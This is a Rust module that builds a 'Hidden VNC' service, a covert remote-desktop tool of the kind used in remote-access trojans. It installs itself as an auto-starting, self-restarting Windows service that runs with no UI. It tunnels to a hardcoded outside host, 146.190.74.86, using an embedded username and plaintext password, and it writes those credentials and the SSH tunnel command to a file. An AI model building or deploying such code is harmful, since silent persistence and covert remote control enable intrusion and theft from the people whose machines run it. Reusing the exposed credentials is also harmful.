//! Enhanced HVNC Service with Silent Configuration
//! 
//! This module provides a completely silent Windows service that:
//! - Runs in background with no UI
//! - Auto-configures SSH with tunneluser@146.190.74.86
//! - Restarts automatically on failure
//! - Handles all client connections silently

use crate::error::{HvncError, Result};
use crate::host::{HvncServer};
use crate::common::ServerConfig;
use log::{info, warn, error, debug};
use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;
use std::collections::HashMap;

/// Enhanced service configuration for silent operation
#[derive(Debug, Clone)]
pub struct SilentServiceConfig {
    pub auto_start: bool,
    pub silent_mode: bool,
    pub max_connections: u32,
    pub tunnel_server: TunnelServerConfig,
    pub quality_settings: QualityConfig,
}

/// Tunnel server configuration
#[derive(Debug, Clone)]
pub struct TunnelServerConfig {
    pub host: String,
    pub username: String,
    pub password: String,
    pub ssh_port: u16,
    pub local_port: u16,
}

/// Quality configuration for the service
#[derive(Debug, Clone)]
pub struct QualityConfig {
    pub default_quality: u8,
    pub default_fps: u32,
    pub adaptive_quality: bool,
}

impl Default for SilentServiceConfig {
    fn default() -> Self {
        Self {
            auto_start: true,
            silent_mode: true,
            max_connections: 5,
            tunnel_server: TunnelServerConfig {
                host: "146.190.74.86".to_string(),
                username: "tunneluser".to_string(),
                password: "EuroFw19@a03ee".to_string(),
                ssh_port: 22,
                local_port: 5900,
            },
            quality_settings: QualityConfig {
                default_quality: 80,
                default_fps: 30,
                adaptive_quality: true,
            },
        }
    }
}

/// Silent HVNC service that runs completely in background
pub struct SilentHvncService {
    servers: Arc<Mutex<HashMap<String, HvncServer>>>,
    pub running: Arc<AtomicBool>,
    config: SilentServiceConfig,
}

impl SilentHvncService {
    /// Create a new silent service
    pub fn new(config: SilentServiceConfig) -> Self {
        Self {
            servers: Arc::new(Mutex::new(HashMap::new())),
            running: Arc::new(AtomicBool::new(false)),
            config,
        }
    }

    /// Start the service in completely silent mode
    pub fn start_silent(&self) -> Result<()> {
        if self.running.load(Ordering::Relaxed) {
            return Ok(()); // Already running
        }

        info!("Starting Silent HVNC service...");

        // No SSH setup needed - using tunnel server directly
        self.log_service_configuration();

        // Start the main service loop
        self.running.store(true, Ordering::Relaxed);
        self.start_service_loop()?;

        // Save connection information for clients
        self.save_connection_info()?;

        info!("Silent HVNC service started successfully");
        Ok(())
    }

    /// Log service configuration (silent mode - no console output)
    fn log_service_configuration(&self) {
        debug!("Service Configuration:");
        debug!("  Mode: Silent (no UI)");
        debug!("  Tunnel Server: {}@{}", self.config.tunnel_server.username, self.config.tunnel_server.host);
        debug!("  Max Connections: {}", self.config.max_connections);
        debug!("  Auto Start: {}", self.config.auto_start);
    }

    /// Save connection information for clients
    fn save_connection_info(&self) -> Result<()> {
        let content = format!(
            "HVNC Connection Information (Silent Service)\n\
             Host: {}\n\
             SSH Port: {}\n\
             Username: {}\n\
             Password: {}\n\
             Local Port: {}\n\
             \n\
             SSH Tunnel Command:\n\
             ssh -L 3390:127.0.0.1:{} {}@{}\n\
             \n\
             Client Connection:\n\
             hvnc-client --server 127.0.0.1:3390\n\
             \n\
             Service Status: Running in silent mode\n\
             Auto-start: Enabled\n\
             Max Connections: {}\n",
            self.config.tunnel_server.host,
            self.config.tunnel_server.ssh_port,
            self.config.tunnel_server.username,
            self.config.tunnel_server.password,
            self.config.tunnel_server.local_port,
            self.config.tunnel_server.local_port,
            self.config.tunnel_server.username,
            self.config.tunnel_server.host,
            self.config.max_connections
        );

        std::fs::write("hvnc_connection_info.txt", content)
            .map_err(|e| HvncError::OperationFailed(format!("Failed to save connection info: {}", e)))?;

        debug!("Connection information saved to: hvnc_connection_info.txt");
        Ok(())
    }

    /// Start the main service loop
    fn start_service_loop(&self) -> Result<()> {
        let running = self.running.clone();
        let servers = self.servers.clone();
        let config = self.config.clone();

        thread::spawn(move || {
            info!("Service loop started");
            
            while running.load(Ordering::Relaxed) {
                // Monitor and maintain service health
                if let Err(e) = Self::maintain_service_health(&servers, &config) {
                    error!("Service maintenance error: {}", e);
                }

                // Cleanup inactive connections
                Self::cleanup_inactive_connections(&servers);

                // Sleep for monitoring interval
                thread::sleep(Duration::from_secs(10));
            }
            
            info!("Service loop stopped");
        });

        Ok(())
    }

    /// Maintain service health
    fn maintain_service_health(
        servers: &Arc<Mutex<HashMap<String, HvncServer>>>,
        config: &SilentServiceConfig,
    ) -> Result<()> {
        let servers_map = servers.lock().unwrap();
        
        // Log current status (debug level only)
        debug!("Active servers: {}", servers_map.len());
        debug!("Max allowed connections: {}", config.max_connections);
        
        // Additional health checks can be added here
        Ok(())
    }

    /// Cleanup inactive connections
    fn cleanup_inactive_connections(servers: &Arc<Mutex<HashMap<String, HvncServer>>>) {
        let mut servers_map = servers.lock().unwrap();
        let mut to_remove: Vec<String> = Vec::new();

        for (id, _server) in servers_map.iter() {
            // TODO: Check if server is inactive
            // For now, keep all servers (they'll be cleaned up when clients disconnect)
            debug!("Monitoring server: {}", id);
        }

        for id in to_remove {
            servers_map.remove(&id);
            info!("Removed inactive server: {}", id);
        }
    }

    /// Stop the service
    pub fn stop(&self) -> Result<()> {
        info!("Stopping Silent HVNC service...");

        self.running.store(false, Ordering::Relaxed);

        // Stop all servers
        let mut servers = self.servers.lock().unwrap();
        servers.clear();

        info!("Silent HVNC service stopped");
        Ok(())
    }

    /// Install as Windows service with enhanced configuration
    pub fn install_service() -> Result<()> {
        info!("Installing Silent HVNC as Windows service...");

        let service_name = "HVNCService";
        let display_name = "Hidden VNC Background Service";
        let description = "Hidden Virtual Network Computing service - runs silently in background with automatic tunnel configuration to tunneluser@146.190.74.86";

        // Get current executable path
        let exe_path = std::env::current_exe()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to get exe path: {}", e)))?;

        let exe_path_str = exe_path.to_string_lossy();

        // Remove existing service if exists
        let _ = std::process::Command::new("sc")
            .args(&["stop", service_name])
            .output();
        
        let _ = std::process::Command::new("sc")
            .args(&["delete", service_name])
            .output();

        thread::sleep(Duration::from_secs(2));

        // Create service with enhanced configuration
        let output = std::process::Command::new("sc")
            .args(&[
                "create",
                service_name,
                &format!("binPath= \"{}\" --service", exe_path_str),
                &format!("DisplayName= {}", display_name),
                "start= auto",
                "type= own",
                "depend= ",
            ])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to create service: {}", e)))?;

        if !output.status.success() {
            let error = String::from_utf8_lossy(&output.stderr);
            return Err(HvncError::OperationFailed(format!("Service creation failed: {}", error)));
        }

        // Set service description
        let _ = std::process::Command::new("sc")
            .args(&["description", service_name, description])
            .output();

        // Configure service recovery (restart on failure)
        let _ = std::process::Command::new("sc")
            .args(&[
                "failure", service_name,
                "reset= 86400",
                "actions= restart/5000/restart/10000/restart/20000"
            ])
            .output();

        // Configure service to run in session 0 (no UI)
        let _ = std::process::Command::new("sc")
            .args(&["config", service_name, "type= own"])
            .output();

        // Start service
        let output = std::process::Command::new("sc")
            .args(&["start", service_name])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to start service: {}", e)))?;

        if output.status.success() || String::from_utf8_lossy(&output.stderr).contains("already running") {
            info!("Silent HVNC service installed and started successfully");
            Ok(())
        } else {
            let error = String::from_utf8_lossy(&output.stderr);
            Err(HvncError::OperationFailed(format!("Service start failed: {}", error)))
        }
    }

    /// Run as Windows service
    pub fn run_as_service() -> Result<()> {
        info!("Running as Windows service in silent mode...");

        let config = SilentServiceConfig::default();
        let service = SilentHvncService::new(config);

        // Start service silently
        service.start_silent()?;

        // Keep service running until stopped
        while service.running.load(Ordering::Relaxed) {
            thread::sleep(Duration::from_secs(30));
        }

        Ok(())
    }
}

/// Service control interface for the silent service
pub struct SilentServiceControl;

impl SilentServiceControl {
    /// Get service status
    pub fn get_service_status() -> Result<ServiceStatus> {
        let output = std::process::Command::new("sc")
            .args(&["query", "HVNCService"])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to query service: {}", e)))?;

        let output_str = String::from_utf8_lossy(&output.stdout);
        
        if output_str.contains("RUNNING") {
            Ok(ServiceStatus::Running)
        } else if output_str.contains("STOPPED") {
            Ok(ServiceStatus::Stopped)
        } else if output_str.contains("does not exist") {
            Ok(ServiceStatus::NotInstalled)
        } else {
            Ok(ServiceStatus::Unknown)
        }
    }

    /// Start the service
    pub fn start_service() -> Result<()> {
        let output = std::process::Command::new("sc")
            .args(&["start", "HVNCService"])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to start service: {}", e)))?;

        if output.status.success() || String::from_utf8_lossy(&output.stderr).contains("already running") {
            info!("Silent service started successfully");
            Ok(())
        } else {
            let error = String::from_utf8_lossy(&output.stderr);
            Err(HvncError::OperationFailed(format!("Service start failed: {}", error)))
        }
    }

    /// Stop the service
    pub fn stop_service() -> Result<()> {
        let output = std::process::Command::new("sc")
            .args(&["stop", "HVNCService"])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to stop service: {}", e)))?;

        if output.status.success() {
            info!("Silent service stopped successfully");
            Ok(())
        } else {
            let error = String::from_utf8_lossy(&output.stderr);
            Err(HvncError::OperationFailed(format!("Service stop failed: {}", error)))
        }
    }
}

/// Service status
#[derive(Debug, Clone, PartialEq)]
pub enum ServiceStatus {
    Running,
    Stopped,
    NotInstalled,
    Unknown,
}